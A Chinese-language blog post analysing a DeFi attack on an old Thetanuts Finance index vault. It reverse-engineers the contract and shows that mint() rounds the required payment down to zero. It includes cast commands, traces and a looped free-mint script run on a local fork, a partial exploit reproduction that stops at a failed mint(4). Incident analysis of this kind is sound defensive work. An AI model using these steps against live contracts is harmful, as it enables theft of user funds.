---
title: "Thetanuts Finance Attack Analysis"
date: 2026-07-13T07:47:15+08:00
draft: false
author: yinhui
categories: ["security"]
tags: ["DeFi", "attack", "security"]
---

[@ThetanutsFi](https://x.com/ThetanutsFi)旧版指数金库漏洞被利用 黑客获利约 10W USDC

本文全部采用正向推理, 而不是通过TX反向验证. 所以内容较长.

<!--more-->

## 基本信息

chain: 1

tx : 0xbba9f138fe39503bfd1aa62932dbd6ab35d37d23d48e4b7bf2988a9d5dc39fec (BLOCK=25323329)

hacker : 0x30498e4466789e534c72e03b52a16c978655b41e (最外层的黑客EOA)

deployer : 0xa589c5342068b0c1fefd44d3c95354427502ac91 (用于部署攻击合约的合约)

attacker : 0x0f9daa9e0adced4e64578b2e131930dde54e492e (真正的攻击合约)

LootReceiver : 0xAf3a0FdBFB0e3127247B66a042310e09C32F2299 (战利品接收EOA)

victim : 0xc2c3ae0a7b405058558c9b4a63b373486cb86ac7 (受害者合约)

## BLCOK

攻击发生的BLOCK: BLOCK=25323329

**所以分析应该基于事发前的BLOCK: PRE_BLOCK=$((BLOCK - 1))  也就是 <span style="color: green;">25323328</span>**

## victim 合约分析

查询 0xc2c3ae0a7b405058558c9b4a63b373486cb86ac7, block 25323328

Source Verification : Unverified

Is Proxy : No

Detected Selector and Method / Signature
(Note: The signatures below are candidate matches from a signature database. They are not verified via ABI. Selector collisions can occur, meaning the actual function name may differ.)

| Selector   | Method / Signature                       |
| ---------- | ---------------------------------------- |
| 0x06fdde03 | name()                                   |
| 0x095ea7b3 | approve(address,uint256)                 |
| 0x0a5c36b3 | setAaveAddressProvider(address)          |
| 0x13966db5 | mintFee()                                |
| 0x166d21fa | 0x166d21fa(address,uint64)               |
| 0x18160ddd | totalSupply()                            |
| 0x1ba2b2e8 | 0x1ba2b2e8()                             |
| 0x23b872dd | transferFrom(address,address,uint256)    |
| 0x313ce567 | decimals()                               |
| 0x379607f5 | claim(uint256)                           |
| 0x39509351 | increaseAllowance(address,uint256)       |
| 0x46e00843 | 0x46e00843(address,uint256)              |
| 0x4be4e91f | vaultAddress(uint256)                    |
| 0x6ff1c9bc | emergencyWithdraw(address)               |
| 0x70a08231 | balanceOf(address)                       |
| 0x715018a6 | renounceOwnership()                      |
| 0x82af54c9 | vaultsLength()                           |
| 0x8da5cb5b | owner()                                  |
| 0x95d89b41 | symbol()                                 |
| 0x96c82e57 | totalWeight()                            |
| 0x9e689393 | withdrawFromLendingPool(address,uint256) |
| 0xa0712d68 | mint(uint256)                            |
| 0xa3039c8b | 0xa3039c8b(address[],uint256[],uint64[]) |
| 0xa42dce80 | setFeeCollector(address)                 |
| 0xa457c2d7 | decreaseAllowance(address,uint256)       |
| 0xa5841194 | sync(address)                            |
| 0xa622ee7c | vaults(address)                          |
| 0xa9059cbb | transfer(address,uint256)                |
| 0xb145a5b8 | isInit()                                 |
| 0xb3f865f7 | rebalance(address,address,uint256)       |
| 0xb81e03b8 | COLLAT()                                 |
| 0xbce896f6 | 0xbce896f6()                             |
| 0xbd82c560 | 0xbd82c560(uint256)                      |
| 0xc415b95c | feeCollector()                           |
| 0xceb68c23 | removeVault(address)                     |
| 0xd1580e20 | 0xd1580e20(address,uint64)               |
| 0xdd62ed3e | allowance(address,address)               |
| 0xe822eb32 | aaveV2LendingPool()                      |
| 0xf2fde38b | transferOwnership(address)               |

下面就可以通过 cast call 或 sol-hex 进行各类重要函数探测

### name /  symbol

Thetanuts Index Vault V1 USDC PUT

TN-IDX-USDC-PUT

### owner

0x4A4c7C5549359b9fFf0137bb3EC4D48c4Aa79Cc7 (EOA)

### isInit

Raw Output (32 bytes) : 0x0000000000000000000000000000000000000000000000000000000000000001 (true)

### COLLAT()

Raw Output : 0x000000000000000000000000a0b86991c6218b36c1d19d4a2e9eb0ce3606eb48
也就是平时的所说的 eth 上的 USDC : 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48 

### feeCollector()

Raw Output : 0x0000000000000000000000000000000000000000000000000000000000000000

### mintFee()

Raw Output : 0x (没有输出)

```
Selector: 0x13966db5
4byte candidate: mintFee()
Raw return: 0x
Actual semantics: 未确认
```



### totalSupply()

Raw Output (32 bytes) : 0x00000000000000000000000000000000000000000000000000000023a2c3dd7c

(is 153054600572)

### totalWeight()

Raw Output : 0x0000000000000000000000000000000000000000000000000000000000000064 (is 100)

### vaultsLength()

Raw Output (32 bytes) : 0x0000000000000000000000000000000000000000000000000000000000000005

金库数量: 5

### aaveV2LendingPool

Raw Output : 0x000000000000000000000000e59ac0874adf2531f536618103c6d06570754383

0xE59ac0874Adf2531f536618103C6D06570754383 (not verified proxy, 实现地址 0x07FDF3e9b0d17B4F8EBB89A0145759ae1A080606 not verified)

### vaultAddress(uint256)

我们刚刚已经拿到了金库数量: 5

那么枚举金库

调用 `vaultAddress(uint256)` 看看返回值, 参数传 0

Raw Output (32 bytes) : 0x0000000000000000000000003ba337f3167ea35910e6979d5bc3b0aee60e7d59 很明显这是一个地址

所以可以直接使用脚本全部遍历了

```
PRE_BLOCK=25323328
for i in 0 1 2 3 4; do
  echo "vault[$i]"
  cast call "$VICTIM" "vaultAddress(uint256)(address)" "$i" \
    --block "$PRE_BLOCK" --rpc-url "$RPC_ETH"
done

---output---
vault[0]
0x3BA337F3167eA35910E6979D5BC3b0AeE60E7d59
vault[1]
0xE1c93dE547cc85CBD568295f6CC322B1dbBCf8Ae
vault[2]
0x248038fDb6F00f4B636812CA6A7F06b81a195AB8
vault[3]
0xE5e8caA04C4b9E1C9bd944A2a78a48b05c3ef3AF
vault[4]
0xAD57221ae9897DA08656aaaBd5B1D4673d4eDE71
```

#### vault[0]

0x3BA337F3167eA35910E6979D5BC3b0AeE60E7d59 (unverified) symbol: TN-CSCPv1-BTCUSD

Detected Selector and Method / Signature
(Note: The signatures below are candidate matches from a signature database. They are not verified via ABI. Selector collisions can occur, meaning the actual function name may differ.)

| Selector   | Method / Signature                                          |
| ---------- | ----------------------------------------------------------- |
| 0x0057dfc5 | 0x0057dfc5()                                                |
| 0x01183203 | settleStrike_MM(uint256)                                    |
| 0x01cceb38 | setExpiry(uint256)                                          |
| 0x0276ee40 | 0x0276ee40()                                                |
| 0x06fdde03 | name()                                                      |
| 0x095ea7b3 | approve(address,uint256)                                    |
| 0x0a5c36b3 | setAaveAddressProvider(address)                             |
| 0x0f43a629 | 0x0f43a629()                                                |
| 0x1327d3d8 | setValidator(address)                                       |
| 0x13af4035 | setOwner(address)                                           |
| 0x18160ddd | totalSupply()                                               |
| 0x23b872dd | transferFrom(address,address,uint256)                       |
| 0x313ce567 | decimals()                                                  |
| 0x37033791 | 0x37033791(uint256)                                         |
| 0x39509351 | increaseAllowance(address,uint256)                          |
| 0x398764b5 | 0x398764b5()                                                |
| 0x3a5381b5 | validator()                                                 |
| 0x3ccfd60b | withdraw()                                                  |
| 0x40777f07 | 0x40777f07(uint256[],uint256,uint256)                       |
| 0x4613d1d0 | 0x4613d1d0()                                                |
| 0x49b5fdb4 | priceReader()                                               |
| 0x4a8c51f4 | 0x4a8c51f4(address)                                         |
| 0x4c4e0107 | 0x4c4e0107(address)                                         |
| 0x53152842 | 0x53152842(uint256)                                         |
| 0x541669e0 | 0x541669e0()                                                |
| 0x549b7974 | 0x549b7974(address)                                         |
| 0x653e80bc | 0x653e80bc()                                                |
| 0x6cf55ea2 | depositOnBehalf(uint256,address)                            |
| 0x6ff1c9bc | emergencyWithdraw(address)                                  |
| 0x70a08231 | balanceOf(address)                                          |
| 0x763265de | setMaxCap(uint256)                                          |
| 0x8232e06e | epochExpiry(uint256)                                        |
| 0x8ba98b71 | 0x8ba98b71(uint256,address)                                 |
| 0x8d44c8f3 | strikeX1e6(uint256)                                         |
| 0x8da5cb5b | owner()                                                     |
| 0x900cf0cf | epoch()                                                     |
| 0x95d89b41 | symbol()                                                    |
| 0x9b72c0da | 0x9b72c0da()                                                |
| 0x9d02ccbe | 0x9d02ccbe()                                                |
| 0xa22b97f5 | withdrawOnBehalf(address)                                   |
| 0xa3f34815 | 0xa3f34815()                                                |
| 0xa42dce80 | setFeeCollector(address)                                    |
| 0xa457c2d7 | decreaseAllowance(address,uint256)                          |
| 0xa9059cbb | transfer(address,uint256)                                   |
| 0xaa15017c | initWithdraw(uint256)                                       |
| 0xaffc1d97 | withdrawFromLendingPool(uint256)                            |
| 0xb4d1d795 | PERIOD()                                                    |
| 0xb6b55f25 | deposit(uint256)                                            |
| 0xb81e03b8 | COLLAT()                                                    |
| 0xbc19a9e2 | setMaker(address)                                           |
| 0xbce896f6 | 0xbce896f6()                                                |
| 0xbd82c560 | 0xbd82c560(uint256)                                         |
| 0xbe069719 | setPriceReader(address)                                     |
| 0xc415b95c | feeCollector()                                              |
| 0xcafbe574 | 0xcafbe574()                                                |
| 0xcf7eb9a1 | LINK_AGGREGATOR()                                           |
| 0xd45ebe57 | 0xd45ebe57()                                                |
| 0xdae206ed | setAllowInteraction(bool)                                   |
| 0xdd62ed3e | allowance(address,address)                                  |
| 0xddaa26ad | START_TIME()                                                |
| 0xe184c9be | expiry()                                                    |
| 0xe46831b4 | 0xe46831b4(uint256[],uint256,uint256,uint256,address,bytes) |
| 0xe822eb32 | aaveV2LendingPool()                                         |
| 0xf3b6131f | depositIntoLendingPool(uint256)                             |
| 0xfd9c652b | syncBalance()                                               |

#### vault[1]

0xE1c93dE547cc85CBD568295f6CC322B1dbBCf8Ae (unverified) symbol:  TN-CSCPv1-ETHUSD

Detected Selector and Method / Signature 和 vault[0]一样

#### vault[2]

0x248038fDb6F00f4B636812CA6A7F06b81a195AB8 (unverified) symbol:  TN-CSCPv1-AVAXUSD

Detected Selector and Method / Signature 和 vault[0]一样

#### vault[3]

0xE5e8caA04C4b9E1C9bd944A2a78a48b05c3ef3AF (unverified) symbol: TN-CSCPv1-BNBUSD

Detected Selector and Method / Signature 和 vault[0]一样

#### vault[4]

0xAD57221ae9897DA08656aaaBd5B1D4673d4eDE71 (unverified) symbol: TN-CSCPv1-MATICUSD

Detected Selector and Method / Signature 和 vault[0]一样



### vaults(address)

上面我们得到 victim : 0xc2c3ae0a7b405058558c9b4a63b373486cb86ac7 关联了 5 个金库

vault[0]: 0x3BA337F3167eA35910E6979D5BC3b0AeE60E7d59

vault[1]: 0xE1c93dE547cc85CBD568295f6CC322B1dbBCf8Ae

vault[2]: 0x248038fDb6F00f4B636812CA6A7F06b81a195AB8

vault[3]: 0xE5e8caA04C4b9E1C9bd944A2a78a48b05c3ef3AF

vault[4]: 0xAD57221ae9897DA08656aaaBd5B1D4673d4eDE71

`vaults(address)` 这个名字虽然是碰撞出来的(也就是说不一定是这个名字), 但很容易联想到这个函数的含义是"get vault info by vault address" , 使用cast call 之类的工具传入vault[0]地址试试: 

返回 Raw Output (128 bytes) : 0x0000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000002d0000000000000000000000000000000000000000000000000000000b935488c80000000000000000000000000000000000000000000000000000000000000000

解码得到 [1, 45, 49716431048, 0]

继续使用 vault[1..4]地址调用vaults(address)得到输出并解码得到

[1, 25, 23955277334, 0]

[1, 5, 6378688542, 0]

[1, 15, 17186382410, 0]

[1, 10, 10028704388, 0]

观察 45 + 25 + 5 + 15 + 10 = 100 (加起来刚好等于totalWeight)

而 23955277334,6378688542,17186382410,10028704388 又是什么呢? 会不会是受害者合约在金库中的余额呢 调用 金库的 balanceOf(address) 函数, 传入victim地址, 5个金库分别返回:
Raw Output (32 bytes) : 0x0000000000000000000000000000000000000000000000000000000b935488c8 ( = 49716431048)
Raw Output (32 bytes) : 0x0000000000000000000000000000000000000000000000000000000593d88616 ( = 23955277334)
Raw Output (32 bytes) : 0x000000000000000000000000000000000000000000000000000000017c33101e ( = 6378688542)
Raw Output (32 bytes) : 0x000000000000000000000000000000000000000000000000000000040063624a ( = 17186382410)
Raw Output (32 bytes) : 0x0000000000000000000000000000000000000000000000000000000255c1e284 ( = 10028704388)

所以 `vaults(address)` 函数传入金库地址返回金库信息: 金库的权重 和 受害者合约在金库中的Vault Token余额 (另外2个数据:1和0, 也许是true和false之类的, 比如表示是否有效之类的, 不深究)

| vault symbol       | vault address <br />(all are unverified)   | vault info <br />[1, 权重, balance, 0] |
| ------------------ | ------------------------------------------ | -------------------------------------- |
| TN-CSCPv1-BTCUSD   | 0x3BA337F3167eA35910E6979D5BC3b0AeE60E7d59 | [1, 45, 49716431048, 0]                |
| TN-CSCPv1-ETHUSD   | 0xE1c93dE547cc85CBD568295f6CC322B1dbBCf8Ae | [1, 25, 23955277334, 0]                |
| TN-CSCPv1-AVAXUSD  | 0x248038fDb6F00f4B636812CA6A7F06b81a195AB8 | [1, 5, 6378688542, 0]                  |
| TN-CSCPv1-BNBUSD   | 0xE5e8caA04C4b9E1C9bd944A2a78a48b05c3ef3AF | [1, 15, 17186382410, 0]                |
| TN-CSCPv1-MATICUSD | 0xAD57221ae9897DA08656aaaBd5B1D4673d4eDE71 | [1, 10, 10028704388, 0]                |



### claim(uint256) - 首次分析

在智能合约中，`claim(uint256)` 是一个高度通用的函数名，它的核心含义是申领某种资产或权益.  实际上我在上面没有资产, 所以先传入0看看效果 (0xC2C3AE0a7b405058558C9b4a63b373486CB86Ac7 是任意EOA)

```
cast call '0xC2C3AE0a7b405058558C9b4a63b373486CB86Ac7' 'claim(uint256)' '0' --from '0x1804c8AB1F12E6bbf3894d4083f33e07309d1f38' --block '25323328' --trace --json --rpc-url $PRC_ETH
```

整理后得到:

```
0 0 -> CALL buildinEOA -> victim . claim(0)
  0 EVENT victim.Transfer (from=buildinEOA, to=0x0000000000000000000000000000000000000000, value=0)
  1 1 -> CALL victim -> TN-CSCPv1-BTCUSD . transfer(buildinEOA, 0) -> (0x0000000000000000000000000000000000000000000000000000000000000001)
    1 EVENT TN-CSCPv1-BTCUSD.Transfer (from=victim, to=buildinEOA, value=0)
  2 1 -> CALL victim -> TN-CSCPv1-ETHUSD . transfer(buildinEOA, 0) -> (0x0000000000000000000000000000000000000000000000000000000000000001)
    2 EVENT TN-CSCPv1-ETHUSD.Transfer (from=victim, to=buildinEOA, value=0)
  3 1 -> CALL victim -> TN-CSCPv1-AVAXUSD . transfer(buildinEOA, 0) -> (0x0000000000000000000000000000000000000000000000000000000000000001)
    3 EVENT TN-CSCPv1-AVAXUSD.Transfer (from=victim, to=buildinEOA, value=0)
  4 1 -> CALL victim -> TN-CSCPv1-BNBUSD . transfer(buildinEOA, 0) -> (0x0000000000000000000000000000000000000000000000000000000000000001)
    4 EVENT TN-CSCPv1-BNBUSD.Transfer (from=victim, to=buildinEOA, value=0)
  5 1 -> CALL victim -> TN-CSCPv1-MATICUSD . transfer(buildinEOA, 0) -> (0x0000000000000000000000000000000000000000000000000000000000000001)
    5 EVENT TN-CSCPv1-MATICUSD.Transfer (from=victim, to=buildinEOA, value=0)
```

`claim` 接受零值，没有 `amount > 0` 的保护

`EVENT victim.Transfer (from=buildinEOA, to=ZeroAddress, value=0)`强烈说明 `claim(amount)` 开头会销毁调用者的 Index Token，逻辑近似  `_burn(msg.sender, amount);`

然后它遍历5个金库并向 `msg.sender` 转出对应的 Vault Token

所以 `claim(uint256)` 的 业务含义是: 用户销毁一定数量的 `TN-IDX-USDC-PUT`，换回指数金库持有的五种 Vault Token。

> 遗留问题: 每个 Vault Token 的转出数量如何根据 amount 计算？因为我们没有实际资产,只传入0,现在无法探测



### mint(uint256)

和 claim  同理, 我们先尝试 0 值

```
cast call '0xC2C3AE0a7b405058558C9b4a63b373486CB86Ac7' 'mint(uint256)' '0' --from '0x1804c8AB1F12E6bbf3894d4083f33e07309d1f38' --block '25323328' --trace --json --rpc-url $PRC_ETH
```

整理得到

```
0 0 -> CALL buildinEOA -> victim . mint(0)
  1 1 -> CALL victim -> TN-CSCPv1-BTCUSD . transferFrom(buildinEOA, victim, 0) -> (0x0000000000000000000000000000000000000000000000000000000000000001)
    1 EVENT TN-CSCPv1-BTCUSD.Approval (owner=buildinEOA, spender=victim, value=0)
    1 EVENT TN-CSCPv1-BTCUSD.Transfer (from=buildinEOA, to=victim, value=0)
  2 1 -> CALL victim -> TN-CSCPv1-ETHUSD . transferFrom(buildinEOA, victim, 0) -> (0x0000000000000000000000000000000000000000000000000000000000000001)
    2 EVENT TN-CSCPv1-ETHUSD.Approval (owner=buildinEOA, spender=victim, value=0)
    2 EVENT TN-CSCPv1-ETHUSD.Transfer (from=buildinEOA, to=victim, value=0)
  3 1 -> CALL victim -> TN-CSCPv1-AVAXUSD . transferFrom(buildinEOA, victim, 0) -> (0x0000000000000000000000000000000000000000000000000000000000000001)
    3 EVENT TN-CSCPv1-AVAXUSD.Approval (owner=buildinEOA, spender=victim, value=0)
    3 EVENT TN-CSCPv1-AVAXUSD.Transfer (from=buildinEOA, to=victim, value=0)
  4 1 -> CALL victim -> TN-CSCPv1-BNBUSD . transferFrom(buildinEOA, victim, 0) -> (0x0000000000000000000000000000000000000000000000000000000000000001)
    4 EVENT TN-CSCPv1-BNBUSD.Approval (owner=buildinEOA, spender=victim, value=0)
    4 EVENT TN-CSCPv1-BNBUSD.Transfer (from=buildinEOA, to=victim, value=0)
  5 1 -> CALL victim -> TN-CSCPv1-MATICUSD . transferFrom(buildinEOA, victim, 0) -> (0x0000000000000000000000000000000000000000000000000000000000000001)
    5 EVENT TN-CSCPv1-MATICUSD.Approval (owner=buildinEOA, spender=victim, value=0)
    5 EVENT TN-CSCPv1-MATICUSD.Transfer (from=buildinEOA, to=victim, value=0)
  0 EVENT victim.Transfer (from=ZeroAddress, to=buildinEOA, value=0)
```

`mint(uint256)` 同样没有零值保护 调用成功了

这一步确认了 `mint()` 与 `claim()` 是镜像关系

mint(amount)
→ 依次从调用者转入五种 Vault Token
→ 最后给调用者铸造 Index Token (  0 EVENT victim.Transfer (from=ZeroAddress, to=buildinEOA, value=0))

因此 `mint(uint256)` 的 `amount` 表示要铸造的TN-IDX-USDC-PUT 数量(而不是要存入的 USDC 或某一种 Vault Token 数量)



**<span style="color: red;">吃瓜时刻:</span>**

我们一次传入 1, 2, 3, 4 再试试

```
0 0 -> CALL buildinEOA -> victim . mint(1)
  1 1 -> CALL victim -> TN-CSCPv1-BTCUSD . transferFrom(buildinEOA, victim, 0) -> (0x0000000000000000000000000000000000000000000000000000000000000001)
    1 EVENT TN-CSCPv1-BTCUSD.Approval (owner=buildinEOA, spender=victim, value=0)
    1 EVENT TN-CSCPv1-BTCUSD.Transfer (from=buildinEOA, to=victim, value=0)
  2 1 -> CALL victim -> TN-CSCPv1-ETHUSD . transferFrom(buildinEOA, victim, 0) -> (0x0000000000000000000000000000000000000000000000000000000000000001)
    2 EVENT TN-CSCPv1-ETHUSD.Approval (owner=buildinEOA, spender=victim, value=0)
    2 EVENT TN-CSCPv1-ETHUSD.Transfer (from=buildinEOA, to=victim, value=0)
  3 1 -> CALL victim -> TN-CSCPv1-AVAXUSD . transferFrom(buildinEOA, victim, 0) -> (0x0000000000000000000000000000000000000000000000000000000000000001)
    3 EVENT TN-CSCPv1-AVAXUSD.Approval (owner=buildinEOA, spender=victim, value=0)
    3 EVENT TN-CSCPv1-AVAXUSD.Transfer (from=buildinEOA, to=victim, value=0)
  4 1 -> CALL victim -> TN-CSCPv1-BNBUSD . transferFrom(buildinEOA, victim, 0) -> (0x0000000000000000000000000000000000000000000000000000000000000001)
    4 EVENT TN-CSCPv1-BNBUSD.Approval (owner=buildinEOA, spender=victim, value=0)
    4 EVENT TN-CSCPv1-BNBUSD.Transfer (from=buildinEOA, to=victim, value=0)
  5 1 -> CALL victim -> TN-CSCPv1-MATICUSD . transferFrom(buildinEOA, victim, 0) -> (0x0000000000000000000000000000000000000000000000000000000000000001)
    5 EVENT TN-CSCPv1-MATICUSD.Approval (owner=buildinEOA, spender=victim, value=0)
    5 EVENT TN-CSCPv1-MATICUSD.Transfer (from=buildinEOA, to=victim, value=0)
  0 EVENT victim.Transfer (from=ZeroAddress, to=buildinEOA, value=1)
```

```
0 0 -> CALL buildinEOA -> victim . mint(2)
  1 1 -> CALL victim -> TN-CSCPv1-BTCUSD . transferFrom(buildinEOA, victim, 0) -> (0x0000000000000000000000000000000000000000000000000000000000000001)
    1 EVENT TN-CSCPv1-BTCUSD.Approval (owner=buildinEOA, spender=victim, value=0)
    1 EVENT TN-CSCPv1-BTCUSD.Transfer (from=buildinEOA, to=victim, value=0)
  2 1 -> CALL victim -> TN-CSCPv1-ETHUSD . transferFrom(buildinEOA, victim, 0) -> (0x0000000000000000000000000000000000000000000000000000000000000001)
    2 EVENT TN-CSCPv1-ETHUSD.Approval (owner=buildinEOA, spender=victim, value=0)
    2 EVENT TN-CSCPv1-ETHUSD.Transfer (from=buildinEOA, to=victim, value=0)
  3 1 -> CALL victim -> TN-CSCPv1-AVAXUSD . transferFrom(buildinEOA, victim, 0) -> (0x0000000000000000000000000000000000000000000000000000000000000001)
    3 EVENT TN-CSCPv1-AVAXUSD.Approval (owner=buildinEOA, spender=victim, value=0)
    3 EVENT TN-CSCPv1-AVAXUSD.Transfer (from=buildinEOA, to=victim, value=0)
  4 1 -> CALL victim -> TN-CSCPv1-BNBUSD . transferFrom(buildinEOA, victim, 0) -> (0x0000000000000000000000000000000000000000000000000000000000000001)
    4 EVENT TN-CSCPv1-BNBUSD.Approval (owner=buildinEOA, spender=victim, value=0)
    4 EVENT TN-CSCPv1-BNBUSD.Transfer (from=buildinEOA, to=victim, value=0)
  5 1 -> CALL victim -> TN-CSCPv1-MATICUSD . transferFrom(buildinEOA, victim, 0) -> (0x0000000000000000000000000000000000000000000000000000000000000001)
    5 EVENT TN-CSCPv1-MATICUSD.Approval (owner=buildinEOA, spender=victim, value=0)
    5 EVENT TN-CSCPv1-MATICUSD.Transfer (from=buildinEOA, to=victim, value=0)
  0 EVENT victim.Transfer (from=ZeroAddress, to=buildinEOA, value=2)
```

```
0 0 -> CALL buildinEOA -> victim . mint(3)
  1 1 -> CALL victim -> TN-CSCPv1-BTCUSD . transferFrom(buildinEOA, victim, 0) -> (0x0000000000000000000000000000000000000000000000000000000000000001)
    1 EVENT TN-CSCPv1-BTCUSD.Approval (owner=buildinEOA, spender=victim, value=0)
    1 EVENT TN-CSCPv1-BTCUSD.Transfer (from=buildinEOA, to=victim, value=0)
  2 1 -> CALL victim -> TN-CSCPv1-ETHUSD . transferFrom(buildinEOA, victim, 0) -> (0x0000000000000000000000000000000000000000000000000000000000000001)
    2 EVENT TN-CSCPv1-ETHUSD.Approval (owner=buildinEOA, spender=victim, value=0)
    2 EVENT TN-CSCPv1-ETHUSD.Transfer (from=buildinEOA, to=victim, value=0)
  3 1 -> CALL victim -> TN-CSCPv1-AVAXUSD . transferFrom(buildinEOA, victim, 0) -> (0x0000000000000000000000000000000000000000000000000000000000000001)
    3 EVENT TN-CSCPv1-AVAXUSD.Approval (owner=buildinEOA, spender=victim, value=0)
    3 EVENT TN-CSCPv1-AVAXUSD.Transfer (from=buildinEOA, to=victim, value=0)
  4 1 -> CALL victim -> TN-CSCPv1-BNBUSD . transferFrom(buildinEOA, victim, 0) -> (0x0000000000000000000000000000000000000000000000000000000000000001)
    4 EVENT TN-CSCPv1-BNBUSD.Approval (owner=buildinEOA, spender=victim, value=0)
    4 EVENT TN-CSCPv1-BNBUSD.Transfer (from=buildinEOA, to=victim, value=0)
  5 1 -> CALL victim -> TN-CSCPv1-MATICUSD . transferFrom(buildinEOA, victim, 0) -> (0x0000000000000000000000000000000000000000000000000000000000000001)
    5 EVENT TN-CSCPv1-MATICUSD.Approval (owner=buildinEOA, spender=victim, value=0)
    5 EVENT TN-CSCPv1-MATICUSD.Transfer (from=buildinEOA, to=victim, value=0)
  0 EVENT victim.Transfer (from=ZeroAddress, to=buildinEOA, value=3)
```

分别免费得到了1, 2, 3 个token.  能免费mint?? 不至于这么弱吧
继续传入 4 

```
0 0 -> CALL buildinEOA -> victim . mint(4) [REVERT]
  1 1 -> CALL victim -> TN-CSCPv1-BTCUSD . transferFrom(buildinEOA, victim, 1) [REVERT]
```

Raw Output (132 bytes) : 0x08c379a00000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000002845524332303a207472616e7366657220616d6f756e74206578636565647320616c6c6f77616e6365000000000000000000000000000000000000000000000000
解码得到 "ERC20: transfer amount exceeds allowance"

注意到trace中的 `1 1 -> CALL victim -> TN-CSCPv1-BTCUSD . transferFrom(buildinEOA, victim, 1) [REVERT]` 有就是说我们传入`4`的时候, 在第一步的时候它想要划走我们`1`个TN-CSCPv1-BTCUSD (我们没有,所以失败了)

继续 (省略步骤,用表格统计)

| mint 数量 | 成功与否 | 要求支付的 TN-CSCPv1-BTCUSD 数量 |
| --------- | -------- | -------------------------------- |
| 0         | yes      | 0                                |
| 1         | yes      | 0                                |
| 2         | yes      | 0                                |
| 3         | yes      | 0                                |
| 4         | no       | 1                                |
| 5         | no       | 1                                |
| 6         | no       | 1                                |
| 7         | no       | 2                                |
| 8         | no       | 2                                |
| 9         | no       | 2                                |
| 10        | no       | 3                                |
| 11        | no       | 3                                |
| 12        | no       | 3                                |
| 13        | no       | 4                                |
| ...       | ...      | ...                              |

有很明显的规律,`mintAmount` 与要求支付的 BTC Vault Token 数量存在明显的整数阶梯：

| mintAmount | BTC Vault Token 支付量 |
| ---------- | ---------------------- |
| 0–3        | 0                      |
| 4–6        | 1                      |
| 7–9        | 2                      |
| 10–12      | 3                      |
| 13         | 4                      |

现在参考 先前得到的victim.totalSupply(): 153054600572 和 金库信息

| vault symbol       | vault address <br />(all are unverified)   | vault info <br />[1, 权重, balance, 0] |
| ------------------ | ------------------------------------------ | -------------------------------------- |
| TN-CSCPv1-BTCUSD   | 0x3BA337F3167eA35910E6979D5BC3b0AeE60E7d59 | [1, 45, 49716431048, 0]                |
| TN-CSCPv1-ETHUSD   | 0xE1c93dE547cc85CBD568295f6CC322B1dbBCf8Ae | [1, 25, 23955277334, 0]                |
| TN-CSCPv1-AVAXUSD  | 0x248038fDb6F00f4B636812CA6A7F06b81a195AB8 | [1, 5, 6378688542, 0]                  |
| TN-CSCPv1-BNBUSD   | 0xE5e8caA04C4b9E1C9bd944A2a78a48b05c3ef3AF | [1, 15, 17186382410, 0]                |
| TN-CSCPv1-MATICUSD | 0xAD57221ae9897DA08656aaaBd5B1D4673d4eDE71 | [1, 10, 10028704388, 0]                |



```text
victim.totalSupply() = 153054600572
BTC Vault Token balance = 49716431048
```

尝试使用以下公式计算：

```text
requiredBTC = BTCVaultBalance × mintAmount / victimTotalSupply
```

Solidity 整数除法向下取整。

例如：

```text
mintAmount = 3

49716431048 × 3 / 153054600572
= 0.974484...
= 0
mintAmount = 4

49716431048 × 4 / 153054600572
= 1.299312...
= 1
mintAmount = 7

49716431048 × 7 / 153054600572
= 2.273796...
= 2
mintAmount = 13

49716431048 × 13 / 153054600572
= 4.222764...
= 4
```

计算结果与实际 Trace 中的 `transferFrom` 数量完全吻合。

因此，可以高度确定 BTC Vault Token 的支付计算近似为：

```solidity
requiredAmount = vaultBalance * mintAmount / totalSupply;
```

此处的 `vaultBalance` 很可能是 `vaults(vaultAddress)` 返回数据中的第三个值；它同时等于该 Vault Token 的 `balanceOf(victim)`。

由于计算结果采用整数向下取整，当：
`vaultBalance × mintAmount < totalSupply` 时，要求支付的该 Vault Token 数量为零。

对于余额最大的 BTC Vault Token：ceil(153054600572 / 49716431048) = 4


因此，在 mintAmount <= 3 时，连余额最大的 BTC Vault Token 都不需要支付；其他四个 Vault Token 的余额更小，自然同样被向下取整为零。

这解释了为什么普通 EOA 无需持有或授权任何 Vault Token，也可以成功调用：

```text
mint(1)
mint(2)
mint(3)
```

并分别获得相应数量的 Index Token。

所以 `mint()` 的核心逻辑代码近似是：

```solidity
for each vault:
    required = vaultBalance * mintAmount / totalSupply;
    vault.transferFrom(msg.sender, address(this), required);

_mint(msg.sender, mintAmount);
```

> 遗留问题, 这虽然能每次免费获得3个token, 但如何放大呢



#### 尝试放大

由于接下来的call或基于前序call的状态改变,所以需要fork

```
anvil --fork-url "$RPC_ETH" --fork-block-number 25323328
```

```
export LOCAL_RPC=http://127.0.0.1:8545
export VICTIM=0xC2C3AE0a7b405058558C9b4a63b373486CB86Ac7

export TESTER=0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266
export TESTER_KEY=0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80
```

```shell
cast call "$VICTIM" "totalSupply()(uint256)" --rpc-url "$LOCAL_RPC"
#开始的供应量 153054600572

cast send "$VICTIM" "mint(uint256)" 3 --private-key "$TESTER_KEY" --rpc-url "$LOCAL_RPC"
cast call "$VICTIM" "balanceOf(address)(uint256)" "$TESTER" --rpc-url "$LOCAL_RPC"
# 挖了3个确实收到了

cast call "$VICTIM" "totalSupply()(uint256)" --rpc-url "$LOCAL_RPC"
#供应量增加到了 153054600575
```

供应量的确增加了, 我们现在使用脚本挖10次

```
for i in {1..10}; do echo "round=$i"; cast send "$VICTIM" "mint(uint256)" 3 --private-key "$TESTER_KEY" --rpc-url "$LOCAL_RPC" >/dev/null || break; cast call "$VICTIM" "totalSupply()(uint256)" --rpc-url "$LOCAL_RPC"; done
```

最终供应量增加到了 153054600605

试试能不能放大了免费挖4个

```
cast call "$VICTIM" "mint(uint256)" 4 --from "$TESTER" --trace --rpc-url "$LOCAL_RPC"
```

````
Traces:
  [20447] 0xC2C3AE0a7b405058558C9b4a63b373486CB86Ac7::mint(4)
    ├─ [2969] 0x3BA337F3167eA35910E6979D5BC3b0AeE60E7d59::transferFrom(0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266, 0xC2C3AE0a7b405058558C9b4a63b373486CB86Ac7, 1)
    │   └─ ← [Revert] ERC20: transfer amount exceeds allowance
